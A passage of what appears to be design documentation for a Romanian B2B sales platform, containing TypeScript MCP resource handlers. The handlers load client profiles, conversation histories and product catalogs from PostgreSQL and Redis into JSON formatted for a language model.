        JOIN segments s ON s.id = cs.segment_id
        WHERE cs.contact_id = $1 AND cs.tenant_id = $2
      `, [clientId, tenantId]);
      
      const content: ClientLLMFormat = {
        id: row.id,
        tenantId: row.tenant_id,
        cui: row.cui,
        companyName: row.company_name,
        tradeName: row.trade_name,
        status: row.status,
        tier: row.tier,
        
        contact: {
          email: row.contact_email,
          phone: row.contact_phone,
          website: row.website,
          contactPerson: row.contact_person,
          position: row.contact_position
        },
        
        address: {
          county: row.county,
          city: row.city,
          street: row.street,
          postalCode: row.postal_code,
          formatted: this.formatAddress(row)
        },
        
        business: {
          caenCode: row.caen_code,
          caenDescription: row.caen_description,
          isAgriculture: row.is_agriculture,
          registrationDate: row.registration_date,
          employees: row.employees,
          capital: row.capital,
          vatPayer: row.vat_payer
        },
        
        financials: {
          lastTurnover: row.last_turnover,
          lastProfit: row.last_profit,
          lastYear: row.last_financial_year,
          paymentScore: row.payment_score,
          creditLimit: row.credit_limit
        },
        
        relationship: {
          acquisitionDate: row.acquisition_date,
          lastOrderDate: row.last_order_date,
          totalOrders: row.total_orders || 0,
          totalRevenue: row.total_revenue || 0,
          averageOrderValue: row.average_order_value,
          preferredPaymentTerms: row.preferred_payment_terms,
          notes: row.notes
        },
        
        engagement: {
          lastContactDate: row.last_contact_date,
          lastEmailDate: row.last_email_date,
          emailOpenRate: row.email_open_rate,
          responseRate: row.response_rate,
          engagementScore: row.engagement_score
        },
        
        tags: tagsResult.rows.map(t => t.name),
        segments: segmentsResult.rows.map(s => s.name)
      };
      
      // Optionally load recent orders
      let orders = null;
      if (options.includeOrders) {
        orders = await this.loadClientOrders(tenantId, clientId, options.ordersLimit || 5);
        (content as any).recentOrders = orders;
      }
      
      // Optionally load recent conversations
      let conversations = null;
      if (options.includeConversations) {
        conversations = await this.loadClientConversations(
          tenantId, 
          clientId, 
          options.conversationsLimit || 3
        );
        (content as any).recentConversations = conversations;
      }
      
      // Calculate token estimate
      const jsonStr = JSON.stringify(content);
      const tokenEstimate = Math.ceil(jsonStr.length / 4);
      
      const metadata: MCPResourceMetadata = {
        uri: `cerniq://clients/${clientId}`,
        resourceType: this.resourceType,
        name: content.companyName,
        description: `Client profile for ${content.companyName} (CUI: ${content.cui})`,
        mimeType: 'application/json',
        size: jsonStr.length,
        tokenEstimate,
        lastModified: new Date(),
        version: '1.0',
        tags: content.tags,
        language: 'ro',
        permissions: ['read'],
        tenantId,
        checksum: createHash('md5').update(jsonStr).digest('hex'),
        additionalMetadata: {
          tier: content.tier,
          status: content.status,
          totalOrders: content.relationship.totalOrders,
          includesOrders: options.includeOrders || false,
          includesConversations: options.includeConversations || false
        }
      };
      
      logger.debug('Client resource loaded', {
        clientId,
        companyName: content.companyName,
        tokens: tokenEstimate,
        loadTime: Date.now() - startTime
      });
      
      return { content, metadata };
      
    } catch (error) {
      logger.error('Failed to load client resource', {
        clientId,
        error: error instanceof Error ? error.message : 'Unknown error'
      });
      throw error;
    }
  }
  
  /**
   * Load client by CUI
   */
  async loadByCUI(
    tenantId: string,
    cui: string,
    options: ClientLoadOptions = {}
  ): Promise<{ content: ClientLLMFormat; metadata: MCPResourceMetadata }> {
    const result = await pool.query(`
      SELECT id FROM contacts_gold WHERE cui = $1 AND tenant_id = $2
    `, [cui, tenantId]);
    
    if (result.rows.length === 0) {
      throw new Error(`Client not found with CUI: ${cui}`);
    }
    
    return this.loadById(tenantId, result.rows[0].id, options);
  }
  
  /**
   * Load multiple clients for batch context
   */
  async loadBatch(
    tenantId: string,
    clientIds: string[],
    options: ClientLoadOptions = {}
  ): Promise<Array<{ content: ClientLLMFormat; metadata: MCPResourceMetadata }>> {
    const results = await Promise.all(
      clientIds.map(id => this.loadById(tenantId, id, options).catch(e => null))
    );
    
    return results.filter((r): r is NonNullable<typeof r> => r !== null);
  }
  
  /**
   * Load client's recent orders
   */
  private async loadClientOrders(
    tenantId: string,
    clientId: string,
    limit: number
  ): Promise<any[]> {
    const result = await pool.query(`
      SELECT 
        o.id,
        o.order_number,
        o.status,
        o.total_amount,
        o.currency,
        o.created_at,
        o.items_count,
        o.payment_status,
        o.delivery_date,
        o.notes
      FROM orders o
      WHERE o.contact_id = $1 AND o.tenant_id = $2
      ORDER BY o.created_at DESC
      LIMIT $3
    `, [clientId, tenantId, limit]);
    
    return result.rows.map(row => ({
      id: row.id,
      orderNumber: row.order_number,
      status: row.status,
      totalAmount: row.total_amount,
      currency: row.currency,
      createdAt: row.created_at,
      itemsCount: row.items_count,
      paymentStatus: row.payment_status,
      deliveryDate: row.delivery_date,
      notes: row.notes
    }));
  }
  
  /**
   * Load client's recent conversations
   */
  private async loadClientConversations(
    tenantId: string,
    clientId: string,
    limit: number
  ): Promise<any[]> {
    const result = await pool.query(`
      SELECT 
        c.id,
        c.channel,
        c.status,
        c.started_at,
        c.ended_at,
        c.message_count,
        c.sentiment_score,
        c.outcome
      FROM conversations c
      WHERE c.contact_id = $1 AND c.tenant_id = $2
      ORDER BY c.started_at DESC
      LIMIT $3
    `, [clientId, tenantId, limit]);
    
    return result.rows.map(row => ({
      id: row.id,
      channel: row.channel,
      status: row.status,
      startedAt: row.started_at,
      endedAt: row.ended_at,
      messageCount: row.message_count,
      sentimentScore: row.sentiment_score,
      outcome: row.outcome
    }));
  }
  
  /**
   * Format address for display
   */
  private formatAddress(row: any): string | null {
    const parts = [
      row.street,
      row.city,
      row.county,
      row.postal_code
    ].filter(Boolean);
    
    return parts.length > 0 ? parts.join(', ') : null;
  }
  
  /**
   * Search clients for resource discovery
   */
  async searchClients(
    tenantId: string,
    query: string,
    options: { limit?: number; tier?: string; status?: string } = {}
  ): Promise<MCPResourceMetadata[]> {
    const params: any[] = [tenantId, `%${query}%`];
    let whereClause = 'g.tenant_id = $1 AND (g.company_name ILIKE $2 OR g.cui ILIKE $2)';
    
    if (options.tier) {
      params.push(options.tier);
      whereClause += ` AND g.tier = $${params.length}`;
    }
    
    if (options.status) {
      params.push(options.status);
      whereClause += ` AND g.status = $${params.length}`;
    }
    
    params.push(options.limit || 10);
    
    const result = await pool.query(`
      SELECT 
        g.id,
        g.company_name,
        g.cui,
        g.tier,
        g.status,
        g.updated_at
      FROM contacts_gold g
      WHERE ${whereClause}
      ORDER BY g.company_name
      LIMIT $${params.length}
    `, params);
    
    return result.rows.map(row => ({
      uri: `cerniq://clients/${row.id}`,
      resourceType: this.resourceType,
      name: row.company_name,
      description: `${row.company_name} (CUI: ${row.cui})`,
      mimeType: 'application/json',
      size: 0,
      tokenEstimate: 500, // Estimate for listing
      lastModified: row.updated_at,
      version: '1.0',
      tags: [row.tier, row.status],
      language: 'ro',
      permissions: ['read'],
      tenantId,
      additionalMetadata: {
        cui: row.cui,
        tier: row.tier,
        status: row.status
      }
    }));
  }
}
```

### 2.4 Conversation Resource Handler

```typescript
// src/workers/mcp/resources/conversation-resource-handler.ts

import { MCP_RESOURCE_TYPES, MCPResourceMetadata } from '../types';
import { pool } from '@cerniq/database';
import { logger } from '@cerniq/logger';
import { createHash } from 'crypto';

interface MessageLLMFormat {
  id: string;
  direction: 'inbound' | 'outbound';
  channel: string;
  content: string;
  contentType: 'text' | 'rich' | 'media';
  timestamp: Date;
  sender: {
    type: 'customer' | 'agent' | 'ai';
    name: string | null;
    email: string | null;
  };
  metadata: {
    sentiment?: number;
    intent?: string;
    emotion?: string;
    isHandover?: boolean;
    isEscalation?: boolean;
  };
}

interface ConversationLLMFormat {
  id: string;
  tenantId: string;
  
  // Conversation Identity
  channel: 'email' | 'whatsapp' | 'web_chat' | 'phone' | 'sms';
  externalId: string | null;
  status: 'active' | 'pending' | 'resolved' | 'escalated' | 'closed';
  
  // Timing
  startedAt: Date;
  lastActivityAt: Date;
  endedAt: Date | null;
  durationMinutes: number | null;
  
  // Customer Info
  customer: {
    id: string;
    companyName: string;
    cui: string;
    contactPerson: string | null;
    email: string | null;
    phone: string | null;
  };
  
  // Conversation Stats
  stats: {
    messageCount: number;
    customerMessages: number;
    agentMessages: number;
    aiMessages: number;
    avgResponseTimeMinutes: number | null;
    handoverCount: number;
    escalationCount: number;
  };
  
  // Analysis Summary
  analysis: {
    overallSentiment: number | null;
    sentimentTrend: 'improving' | 'declining' | 'stable' | null;
    primaryIntent: string | null;
    primaryEmotion: string | null;
    riskLevel: 'low' | 'medium' | 'high' | 'critical' | null;
    topics: string[];
  };
  
  // Outcome
  outcome: {
    type: string | null;
    resolution: string | null;
    satisfactionScore: number | null;
    followUpRequired: boolean;
    nextAction: string | null;
  };
  
  // Messages
  messages: MessageLLMFormat[];
  
  // Context
  context: {
    previousConversations: number;
    relatedOrderId: string | null;
    relatedQuoteId: string | null;
    tags: string[];
    notes: string | null;
  };
}

interface ConversationLoadOptions {
  includeMessages?: boolean;
  messagesLimit?: number;
  includeAnalysis?: boolean;
  includeContext?: boolean;
  maxTokens?: number;
}

export class ConversationResourceHandler {
  private readonly resourceType = 'conversation' as const;
  
  /**
   * Load conversation resource by ID
   */
  async loadById(
    tenantId: string,
    conversationId: string,
    options: ConversationLoadOptions = {}
  ): Promise<{ content: ConversationLLMFormat; metadata: MCPResourceMetadata }> {
    const startTime = Date.now();
    
    const {
      includeMessages = true,
      messagesLimit = 50,
      includeAnalysis = true,
      includeContext = true
    } = options;
    
    try {
      // Load conversation with customer info
      const convResult = await pool.query(`
        SELECT 
          c.*,
          g.id as customer_id,
          g.company_name,
          g.cui,
          s.contact_person,
          s.email as customer_email,
          s.phone as customer_phone,
          
          -- Stats
          (SELECT COUNT(*) FROM messages WHERE conversation_id = c.id) as message_count,
          (SELECT COUNT(*) FROM messages WHERE conversation_id = c.id AND direction = 'inbound') as customer_messages,
          (SELECT COUNT(*) FROM messages WHERE conversation_id = c.id AND direction = 'outbound' AND sender_type = 'agent') as agent_messages,
          (SELECT COUNT(*) FROM messages WHERE conversation_id = c.id AND direction = 'outbound' AND sender_type = 'ai') as ai_messages,
          (SELECT AVG(response_time_seconds) / 60 FROM messages WHERE conversation_id = c.id AND response_time_seconds IS NOT NULL) as avg_response_time,
          (SELECT COUNT(*) FROM conversation_handovers WHERE conversation_id = c.id) as handover_count,
          (SELECT COUNT(*) FROM conversation_escalations WHERE conversation_id = c.id) as escalation_count
          
        FROM conversations c
        JOIN contacts_gold g ON g.id = c.contact_id
        JOIN contacts_silver s ON s.id = g.silver_id
        WHERE c.id = $1 AND c.tenant_id = $2
      `, [conversationId, tenantId]);
      
      if (convResult.rows.length === 0) {
        throw new Error(`Conversation not found: ${conversationId}`);
      }
      
      const row = convResult.rows[0];
      
      // Calculate duration
      const durationMinutes = row.ended_at 
        ? Math.round((new Date(row.ended_at).getTime() - new Date(row.started_at).getTime()) / 60000)
        : row.last_activity_at
          ? Math.round((new Date(row.last_activity_at).getTime() - new Date(row.started_at).getTime()) / 60000)
          : null;
      
      const content: ConversationLLMFormat = {
        id: row.id,
        tenantId: row.tenant_id,
        channel: row.channel,
        externalId: row.external_id,
        status: row.status,
        startedAt: row.started_at,
        lastActivityAt: row.last_activity_at,
        endedAt: row.ended_at,
        durationMinutes,
        
        customer: {
          id: row.customer_id,
          companyName: row.company_name,
          cui: row.cui,
          contactPerson: row.contact_person,
          email: row.customer_email,
          phone: row.customer_phone
        },
        
        stats: {
          messageCount: parseInt(row.message_count) || 0,
          customerMessages: parseInt(row.customer_messages) || 0,
          agentMessages: parseInt(row.agent_messages) || 0,
          aiMessages: parseInt(row.ai_messages) || 0,
          avgResponseTimeMinutes: row.avg_response_time ? parseFloat(row.avg_response_time) : null,
          handoverCount: parseInt(row.handover_count) || 0,
          escalationCount: parseInt(row.escalation_count) || 0
        },
        
        analysis: {
          overallSentiment: null,
          sentimentTrend: null,
          primaryIntent: null,
          primaryEmotion: null,
          riskLevel: null,
          topics: []
        },
        
        outcome: {
          type: row.outcome_type,
          resolution: row.resolution,
          satisfactionScore: row.satisfaction_score,
          followUpRequired: row.follow_up_required || false,
          nextAction: row.next_action
        },
        
        messages: [],
        
        context: {
          previousConversations: 0,
          relatedOrderId: row.related_order_id,
          relatedQuoteId: row.related_quote_id,
          tags: [],
          notes: row.notes
        }
      };
      
      // Load messages if requested
      if (includeMessages) {
        content.messages = await this.loadMessages(tenantId, conversationId, messagesLimit);
      }
      
      // Load analysis if requested
      if (includeAnalysis) {
        const analysis = await this.loadAnalysisSummary(tenantId, conversationId);
        if (analysis) {
          content.analysis = analysis;
        }
      }
      
      // Load context if requested
      if (includeContext) {
        const ctx = await this.loadConversationContext(tenantId, conversationId, row.customer_id);
        content.context = { ...content.context, ...ctx };
      }
      
      // Calculate token estimate
      const jsonStr = JSON.stringify(content);
      const tokenEstimate = Math.ceil(jsonStr.length / 4);
      
      // Apply token limit if specified
      if (options.maxTokens && tokenEstimate > options.maxTokens) {
        // Truncate messages to fit
        const targetTokens = options.maxTokens * 0.8; // Leave some room
        const messageTokens = Math.ceil(JSON.stringify(content.messages).length / 4);
        const otherTokens = tokenEstimate - messageTokens;
        
        if (messageTokens > targetTokens - otherTokens) {
          const allowedMessageTokens = targetTokens - otherTokens;
          const allowedMessages = Math.floor((content.messages.length * allowedMessageTokens) / messageTokens);
          content.messages = content.messages.slice(-allowedMessages);
        }
      }
      
      const finalJsonStr = JSON.stringify(content);
      const finalTokens = Math.ceil(finalJsonStr.length / 4);
      
      const metadata: MCPResourceMetadata = {
        uri: `cerniq://conversations/${conversationId}`,
        resourceType: this.resourceType,
        name: `Conversation with ${content.customer.companyName}`,
        description: `${content.channel} conversation started ${content.startedAt.toISOString().split('T')[0]}`,
        mimeType: 'application/json',
        size: finalJsonStr.length,
        tokenEstimate: finalTokens,
        lastModified: content.lastActivityAt,
        version: '1.0',
        tags: [content.channel, content.status],
        language: 'ro',
        permissions: ['read'],
        tenantId,
        checksum: createHash('md5').update(finalJsonStr).digest('hex'),
        additionalMetadata: {
          channel: content.channel,
          status: content.status,
          messageCount: content.stats.messageCount,
          customerId: content.customer.id,
          riskLevel: content.analysis.riskLevel
        }
      };
      
      logger.debug('Conversation resource loaded', {
        conversationId,
        messageCount: content.messages.length,
        tokens: finalTokens,
        loadTime: Date.now() - startTime
      });
      
      return { content, metadata };
      
    } catch (error) {
      logger.error('Failed to load conversation resource', {
        conversationId,
        error: error instanceof Error ? error.message : 'Unknown error'
      });
      throw error;
    }
  }
  
  /**
   * Load messages for conversation
   */
  private async loadMessages(
    tenantId: string,
    conversationId: string,
    limit: number
  ): Promise<MessageLLMFormat[]> {
    const result = await pool.query(`
      SELECT 
        m.*,
        u.name as agent_name,
        u.email as agent_email,
        s.sentiment_score,
        i.primary_intent,
        e.primary_emotion
      FROM messages m
      LEFT JOIN users u ON u.id = m.agent_id
      LEFT JOIN sentiment_analyses s ON s.message_id = m.id
      LEFT JOIN intent_detections i ON i.message_id = m.id
      LEFT JOIN emotion_recognitions e ON e.message_id = m.id
      WHERE m.conversation_id = $1 AND m.tenant_id = $2
      ORDER BY m.created_at DESC
      LIMIT $3
    `, [conversationId, tenantId, limit]);
    
    // Reverse to get chronological order
    return result.rows.reverse().map(row => ({
      id: row.id,
      direction: row.direction,
      channel: row.channel,
      content: row.content,
      contentType: row.content_type || 'text',
      timestamp: row.created_at,
      sender: {
        type: row.sender_type || (row.direction === 'inbound' ? 'customer' : 'ai'),
        name: row.sender_type === 'agent' ? row.agent_name : null,
        email: row.sender_type === 'agent' ? row.agent_email : null
      },
      metadata: {
        sentiment: row.sentiment_score,
        intent: row.primary_intent,
        emotion: row.primary_emotion,
        isHandover: row.is_handover || false,
        isEscalation: row.is_escalation || false
      }
    }));
  }
  
  /**
   * Load analysis summary for conversation
   */
  private async loadAnalysisSummary(
    tenantId: string,
    conversationId: string
  ): Promise<ConversationLLMFormat['analysis'] | null> {
    // Get latest aggregate
    const aggResult = await pool.query(`
      SELECT 
        composite_score,
        risk_level,
        trend
      FROM analysis_aggregates
      WHERE conversation_id = $1 AND tenant_id = $2
      ORDER BY created_at DESC
      LIMIT 1
    `, [conversationId, tenantId]);
    
    // Get primary intent
    const intentResult = await pool.query(`
      SELECT primary_intent, COUNT(*) as cnt
      FROM intent_detections
      WHERE conversation_id = $1 AND tenant_id = $2
      GROUP BY primary_intent
      ORDER BY cnt DESC
      LIMIT 1
    `, [conversationId, tenantId]);
    
    // Get primary emotion
    const emotionResult = await pool.query(`
      SELECT primary_emotion, COUNT(*) as cnt
      FROM emotion_recognitions
      WHERE conversation_id = $1 AND tenant_id = $2
      GROUP BY primary_emotion
      ORDER BY cnt DESC
      LIMIT 1
    `, [conversationId, tenantId]);
    
    // Get topics
    const topicsResult = await pool.query(`
      SELECT DISTINCT unnest(topics) as topic
      FROM analysis_aggregates
      WHERE conversation_id = $1 AND tenant_id = $2
      LIMIT 10
    `, [conversationId, tenantId]);
    
    return {
      overallSentiment: aggResult.rows[0]?.composite_score ?? null,
      sentimentTrend: aggResult.rows[0]?.trend ?? null,
      primaryIntent: intentResult.rows[0]?.primary_intent ?? null,
      primaryEmotion: emotionResult.rows[0]?.primary_emotion ?? null,
      riskLevel: aggResult.rows[0]?.risk_level ?? null,
      topics: topicsResult.rows.map(r => r.topic)
    };
  }
  
  /**
   * Load conversation context
   */
  private async loadConversationContext(
    tenantId: string,
    conversationId: string,
    customerId: string
  ): Promise<Partial<ConversationLLMFormat['context']>> {
    // Count previous conversations
    const prevResult = await pool.query(`
      SELECT COUNT(*) as cnt
      FROM conversations
      WHERE contact_id = $1 AND tenant_id = $2 AND id != $3
    `, [customerId, tenantId, conversationId]);
    
    // Get tags
    const tagsResult = await pool.query(`
      SELECT t.name
      FROM conversation_tags ct
      JOIN tags t ON t.id = ct.tag_id
      WHERE ct.conversation_id = $1
    `, [conversationId]);
    
    return {
      previousConversations: parseInt(prevResult.rows[0].cnt) || 0,
      tags: tagsResult.rows.map(r => r.name)
    };
  }
  
  /**
   * Load active conversation for customer
   */
  async loadActiveForCustomer(
    tenantId: string,
    customerId: string,
    options: ConversationLoadOptions = {}
  ): Promise<{ content: ConversationLLMFormat; metadata: MCPResourceMetadata } | null> {
    const result = await pool.query(`
      SELECT id FROM conversations
      WHERE contact_id = $1 AND tenant_id = $2 AND status = 'active'
      ORDER BY last_activity_at DESC
      LIMIT 1
    `, [customerId, tenantId]);
    
    if (result.rows.length === 0) {
      return null;
    }
    
    return this.loadById(tenantId, result.rows[0].id, options);
  }
  
  /**
   * Search conversations for resource discovery
   */
  async searchConversations(
    tenantId: string,
    options: {
      customerId?: string;
      channel?: string;
      status?: string;
      dateFrom?: Date;
      dateTo?: Date;
      limit?: number;
    } = {}
  ): Promise<MCPResourceMetadata[]> {
    const params: any[] = [tenantId];
    const conditions: string[] = ['c.tenant_id = $1'];
    
    if (options.customerId) {
      params.push(options.customerId);
      conditions.push(`c.contact_id = $${params.length}`);
    }
    
    if (options.channel) {
      params.push(options.channel);
      conditions.push(`c.channel = $${params.length}`);
    }
    
    if (options.status) {
      params.push(options.status);
      conditions.push(`c.status = $${params.length}`);
    }
    
    if (options.dateFrom) {
      params.push(options.dateFrom);
      conditions.push(`c.started_at >= $${params.length}`);
    }
    
    if (options.dateTo) {
      params.push(options.dateTo);
      conditions.push(`c.started_at <= $${params.length}`);
    }
    
    params.push(options.limit || 20);
    
    const result = await pool.query(`
      SELECT 
        c.id,
        c.channel,
        c.status,
        c.started_at,
        c.last_activity_at,
        g.company_name,
        (SELECT COUNT(*) FROM messages WHERE conversation_id = c.id) as message_count
      FROM conversations c
      JOIN contacts_gold g ON g.id = c.contact_id
      WHERE ${conditions.join(' AND ')}
      ORDER BY c.last_activity_at DESC
      LIMIT $${params.length}
    `, params);
    
    return result.rows.map(row => ({
      uri: `cerniq://conversations/${row.id}`,
      resourceType: this.resourceType,
      name: `${row.channel} - ${row.company_name}`,
      description: `Started ${row.started_at.toISOString().split('T')[0]}, ${row.message_count} messages`,
      mimeType: 'application/json',
      size: 0,
      tokenEstimate: 200 + (parseInt(row.message_count) * 50), // Estimate based on messages
      lastModified: row.last_activity_at,
      version: '1.0',
      tags: [row.channel, row.status],
      language: 'ro',
      permissions: ['read'],
      tenantId,
      additionalMetadata: {
        channel: row.channel,
        status: row.status,
        companyName: row.company_name,
        messageCount: parseInt(row.message_count)
      }
    }));
  }
}
```

### 2.5 Catalog Resource Handler

```typescript
// src/workers/mcp/resources/catalog-resource-handler.ts

import { MCP_RESOURCE_TYPES, MCPResourceMetadata } from '../types';
import { pool } from '@cerniq/database';
import { redisClient } from '@cerniq/redis';
import { logger } from '@cerniq/logger';
import { createHash } from 'crypto';

interface CatalogLLMFormat {
  id: string;
  tenantId: string;
  name: string;
  description: string | null;
  type: 'general' | 'seasonal' | 'promotional' | 'category' | 'custom';
  
  // Validity
  validFrom: Date | null;
  validUntil: Date | null;
  isActive: boolean;
  
  // Catalog Structure
  structure: {
    totalCategories: number;
    totalProducts: number;
    priceRange: {
      min: number;
      max: number;
      currency: string;
    };
    stockSummary: {
      inStock: number;
      lowStock: number;
      outOfStock: number;
    };
  };
  
  // Categories
  categories: Array<{
    id: string;
    name: string;
    nameRo: string;
    productCount: number;
    subcategories?: Array<{
      id: string;
      name: string;
      nameRo: string;
      productCount: number;
    }>;
  }>;
  
  // Featured Products
  featuredProducts: Array<{
    id: string;
    sku: string;
    name: string;
    nameRo: string;
    price: number;
    currency: string;
    category: string;
    inStock: boolean;
  }>;
  
  // Promotions
  activePromotions: Array<{
    id: string;
    name: string;
    type: 'percentage' | 'fixed' | 'bundle' | 'bogo';
    discount: number;
    validUntil: Date | null;
    applicableProducts: number;
  }>;
  
  // Metadata
  lastUpdated: Date;
  version: string;
}

interface CatalogLoadOptions {
  includeCategories?: boolean;
  includeFeatured?: boolean;
  includePromotions?: boolean;
  featuredLimit?: number;
  maxTokens?: number;
}

export class CatalogResourceHandler {
  private readonly resourceType = 'catalog' as const;
  private readonly CACHE_TTL = 300; // 5 minutes
  
  /**
   * Load catalog resource by ID
   */
  async loadById(
    tenantId: string,
    catalogId: string,
    options: CatalogLoadOptions = {}
  ): Promise<{ content: CatalogLLMFormat; metadata: MCPResourceMetadata }> {
    const startTime = Date.now();
    const cacheKey = `mcp:catalog:${tenantId}:${catalogId}`;
    
    const {
      includeCategories = true,
      includeFeatured = true,
      includePromotions = true,
      featuredLimit = 20
    } = options;
    
    try {
      // Check cache first
      const cached = await redisClient.get(cacheKey);
      if (cached) {
        const { content, metadata } = JSON.parse(cached);
        logger.debug('Catalog loaded from cache', { catalogId });
        return { content, metadata };
      }
      
      // Load catalog base info
      const catResult = await pool.query(`
        SELECT 
          c.*,
          (SELECT COUNT(DISTINCT category) FROM products WHERE tenant_id = c.tenant_id AND catalog_id = c.id) as total_categories,
          (SELECT COUNT(*) FROM products WHERE tenant_id = c.tenant_id AND catalog_id = c.id AND is_active = true) as total_products,
          (SELECT MIN(base_price) FROM products WHERE tenant_id = c.tenant_id AND catalog_id = c.id AND is_active = true) as min_price,
          (SELECT MAX(base_price) FROM products WHERE tenant_id = c.tenant_id AND catalog_id = c.id AND is_active = true) as max_price,
          (SELECT COUNT(*) FROM products WHERE tenant_id = c.tenant_id AND catalog_id = c.id AND is_active = true AND stock_quantity > 10) as in_stock,
          (SELECT COUNT(*) FROM products WHERE tenant_id = c.tenant_id AND catalog_id = c.id AND is_active = true AND stock_quantity BETWEEN 1 AND 10) as low_stock,
          (SELECT COUNT(*) FROM products WHERE tenant_id = c.tenant_id AND catalog_id = c.id AND is_active = true AND stock_quantity = 0) as out_of_stock
        FROM catalogs c
        WHERE c.id = $1 AND c.tenant_id = $2
      `, [catalogId, tenantId]);
      
      if (catResult.rows.length === 0) {
        throw new Error(`Catalog not found: ${catalogId}`);
      }
      
      const row = catResult.rows[0];
      
      const content: CatalogLLMFormat = {
        id: row.id,
        tenantId: row.tenant_id,
        name: row.name,
        description: row.description,
        type: row.type || 'general',
        validFrom: row.valid_from,
        validUntil: row.valid_until,
        isActive: row.is_active,
        
        structure: {
          totalCategories: parseInt(row.total_categories) || 0,
          totalProducts: parseInt(row.total_products) || 0,
          priceRange: {
            min: parseFloat(row.min_price) || 0,
            max: parseFloat(row.max_price) || 0,
            currency: 'RON'
          },
          stockSummary: {
            inStock: parseInt(row.in_stock) || 0,
            lowStock: parseInt(row.low_stock) || 0,
            outOfStock: parseInt(row.out_of_stock) || 0
          }
        },
        
        categories: [],
        featuredProducts: [],
        activePromotions: [],
        lastUpdated: row.updated_at,
        version: row.version || '1.0'
      };
      
      // Load categories if requested
      if (includeCategories) {
        content.categories = await this.loadCategories(tenantId, catalogId);
      }
      
      // Load featured products if requested
      if (includeFeatured) {
        content.featuredProducts = await this.loadFeaturedProducts(tenantId, catalogId, featuredLimit);
      }
      
      // Load promotions if requested
      if (includePromotions) {
        content.activePromotions = await this.loadActivePromotions(tenantId, catalogId);
      }
      
      // Calculate token estimate
      const jsonStr = JSON.stringify(content);
      const tokenEstimate = Math.ceil(jsonStr.length / 4);
      
      const metadata: MCPResourceMetadata = {
        uri: `cerniq://catalogs/${catalogId}`,
        resourceType: this.resourceType,
        name: content.name,
        description: content.description || `${content.type} catalog with ${content.structure.totalProducts} products`,
        mimeType: 'application/json',
        size: jsonStr.length,
        tokenEstimate,
        lastModified: content.lastUpdated,
        version: content.version,
        tags: [content.type, content.isActive ? 'active' : 'inactive'],
        language: 'ro',
        permissions: ['read'],
        tenantId,
        checksum: createHash('md5').update(jsonStr).digest('hex'),
        additionalMetadata: {
          type: content.type,
          isActive: content.isActive,
          totalProducts: content.structure.totalProducts,
          totalCategories: content.structure.totalCategories
        }
      };
      
      // Cache result
      await redisClient.setEx(
        cacheKey,
        this.CACHE_TTL,
        JSON.stringify({ content, metadata })
      );
      
      logger.debug('Catalog resource loaded', {
        catalogId,
        products: content.structure.totalProducts,
        tokens: tokenEstimate,
        loadTime: Date.now() - startTime
      });
      
      return { content, metadata };
      
    } catch (error) {
      logger.error('Failed to load catalog resource', {
        catalogId,
        error: error instanceof Error ? error.message : 'Unknown error'
      });
      throw error;
    }
  }
  
  /**
   * Load categories for catalog
   */
  private async loadCategories(
    tenantId: string,
    catalogId: string
  ): Promise<CatalogLLMFormat['categories']> {
    const result = await pool.query(`
      SELECT 
        pc.id,
        pc.name,
        pc.name_ro,
        pc.parent_id,
        (SELECT COUNT(*) FROM products p WHERE p.category_id = pc.id AND p.catalog_id = $2 AND p.is_active = true) as product_count
      FROM product_categories pc
      WHERE pc.tenant_id = $1
        AND EXISTS (
          SELECT 1 FROM products p WHERE p.category_id = pc.id AND p.catalog_id = $2
        )
      ORDER BY pc.display_order, pc.name
    `, [tenantId, catalogId]);
    
    // Build hierarchy
    const categoryMap = new Map<string, any>();
    const rootCategories: CatalogLLMFormat['categories'] = [];
    
    // First pass: create all categories
    for (const row of result.rows) {
      categoryMap.set(row.id, {
        id: row.id,
        name: row.name,
        nameRo: row.name_ro,
        productCount: parseInt(row.product_count) || 0,
        parentId: row.parent_id,
        subcategories: []
      });
    }
    
    // Second pass: build hierarchy
    for (const [id, cat] of categoryMap) {
      if (cat.parentId && categoryMap.has(cat.parentId)) {
        const parent = categoryMap.get(cat.parentId);
        parent.subcategories.push({
          id: cat.id,
          name: cat.name,
          nameRo: cat.nameRo,
          productCount: cat.productCount
        });
      } else {
        rootCategories.push({
          id: cat.id,
          name: cat.name,
          nameRo: cat.nameRo,
          productCount: cat.productCount,
          subcategories: cat.subcategories.length > 0 ? cat.subcategories : undefined
        });
      }
    }
    
    return rootCategories;
  }
  
  /**
   * Load featured products for catalog
   */
  private async loadFeaturedProducts(
    tenantId: string,
    catalogId: string,
    limit: number
  ): Promise<CatalogLLMFormat['featuredProducts']> {
    const result = await pool.query(`
      SELECT 
        p.id,
        p.sku,
        p.name,
        p.name_ro,
        p.base_price,
        p.currency,
        pc.name as category_name,
        p.stock_quantity > 0 as in_stock
      FROM products p
      LEFT JOIN product_categories pc ON pc.id = p.category_id
      WHERE p.tenant_id = $1 
        AND p.catalog_id = $2 
        AND p.is_active = true
        AND (p.is_featured = true OR p.popularity_score > 80)
      ORDER BY p.is_featured DESC, p.popularity_score DESC
      LIMIT $3
    `, [tenantId, catalogId, limit]);
    
    return result.rows.map(row => ({
      id: row.id,
      sku: row.sku,
      name: row.name,
      nameRo: row.name_ro,
      price: parseFloat(row.base_price),
      currency: row.currency || 'RON',
      category: row.category_name,
      inStock: row.in_stock
    }));
  }
  
  /**
   * Load active promotions for catalog
   */
  private async loadActivePromotions(
    tenantId: string,
    catalogId: string
  ): Promise<CatalogLLMFormat['activePromotions']> {
    const result = await pool.query(`
      SELECT 
        pr.id,
        pr.name,
        pr.type,
        pr.discount_value,
        pr.valid_until,
        (SELECT COUNT(*) FROM promotion_products pp WHERE pp.promotion_id = pr.id) as applicable_products
      FROM promotions pr
      WHERE pr.tenant_id = $1
        AND (pr.catalog_id = $2 OR pr.catalog_id IS NULL)
        AND pr.is_active = true
        AND (pr.valid_from IS NULL OR pr.valid_from <= NOW())
        AND (pr.valid_until IS NULL OR pr.valid_until >= NOW())
      ORDER BY pr.priority DESC, pr.discount_value DESC
      LIMIT 10
    `, [tenantId, catalogId]);
    
    return result.rows.map(row => ({
      id: row.id,
      name: row.name,
      type: row.type,
      discount: parseFloat(row.discount_value),
      validUntil: row.valid_until,
      applicableProducts: parseInt(row.applicable_products) || 0
    }));
  }
  
  /**
   * Load default/primary catalog for tenant
   */
  async loadDefault(
    tenantId: string,
    options: CatalogLoadOptions = {}
  ): Promise<{ content: CatalogLLMFormat; metadata: MCPResourceMetadata }> {
    const result = await pool.query(`
      SELECT id FROM catalogs
      WHERE tenant_id = $1 AND is_default = true AND is_active = true
      LIMIT 1
    `, [tenantId]);
    
    if (result.rows.length === 0) {
      // Try to get any active catalog
      const fallback = await pool.query(`
